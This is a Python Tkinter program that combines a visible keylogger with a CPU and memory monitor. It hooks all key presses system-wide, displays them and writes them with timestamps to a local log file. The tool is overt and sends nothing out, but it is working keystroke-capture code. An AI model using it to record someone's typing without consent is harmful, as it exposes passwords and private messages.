import tkinter as tk
from tkinter import scrolledtext
import keyboard
import psutil
import datetime
import time
from threading import Thread

# Log file for keystrokes and system usage
keylog_file = "keystroke_log.txt"
system_log_file = "system_usage_log.txt"

# Create a GUI class
class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("System Activity and Keylogger Monitor")
        self.root.geometry("600x400")
        
        self.is_keylogger_running = False
        self.is_monitoring_system = False
        
        # Create a text box for displaying keystrokes
        self.keystroke_text = scrolledtext.ScrolledText(self.root, width=70, height=10)
        self.keystroke_text.pack(pady=10)
        
        # Create a label for system resource usage (CPU and Memory)
        self.system_status_label = tk.Label(self.root, text="System Monitoring: Not Active", font=("Arial", 12))
        self.system_status_label.pack(pady=5)
        
        # Create buttons to start and stop the keylogger and system monitor
        self.start_button = tk.Button(self.root, text="Start Keylogger and Monitor", command=self.start_monitoring)
        self.start_button.pack(pady=5)
        
        self.stop_button = tk.Button(self.root, text="Stop Keylogger and Monitor", command=self.stop_monitoring)
        self.stop_button.pack(pady=5)

    def log_keystroke(self, event):
        # Capture the key and timestamp
        key = event.name
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Update the keystrokes in the Text widget and also log to file
        self.keystroke_text.insert(tk.END, f"{timestamp} - {key}\n")
        self.keystroke_text.yview(tk.END)
        
        # Also write to the log file
        with open(keylog_file, "a") as f:
            f.write(f"{timestamp} - {key}\n")
    
    def start_keylogger(self):
        # Start listening for key presses
        keyboard.on_press(self.log_keystroke)
        self.is_keylogger_running = True
        print("Keylogger started...")

    def stop_keylogger(self):
        # Stop listening for key presses
        keyboard.unhook_all()
        self.is_keylogger_running = False
        print("Keylogger stopped.")
    
    def monitor_system(self):
        while self.is_monitoring_system:
            # Get system resource usage
            cpu_usage = psutil.cpu_percent(interval=1)
            memory_info = psutil.virtual_memory()
            
            # Update the system status label with the latest stats
            status = f"CPU Usage: {cpu_usage}% | Memory Usage: {memory_info.percent}%"
            self.system_status_label.config(text=status)
            
            # Log system usage to a file
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(system_log_file, "a") as f:
                f.write(f"{timestamp} - {status}\n")
            
            # Sleep for a few seconds before updating again
            time.sleep(3)

    def start_monitoring(self):
        # Start the keylogger and system monitor in separate threads
        if not self.is_keylogger_running:
            self.start_keylogger()
        
        if not self.is_monitoring_system:
            self.is_monitoring_system = True
            system_monitor_thread = Thread(target=self.monitor_system, daemon=True)
            system_monitor_thread.start()

        # Update the status label and button states
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.system_status_label.config(text="System Monitoring: Active")

    def stop_monitoring(self):
        # Stop both the keylogger and system monitor
        if self.is_keylogger_running:
            self.stop_keylogger()
        
        self.is_monitoring_system = False
        
        # Update the status label and button states
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.system_status_label.config(text="System Monitoring: Not Active")


# Create the main window
root = tk.Tk()
app = KeyloggerApp(root)

# Run the Tkinter main loop
root.mainloop()
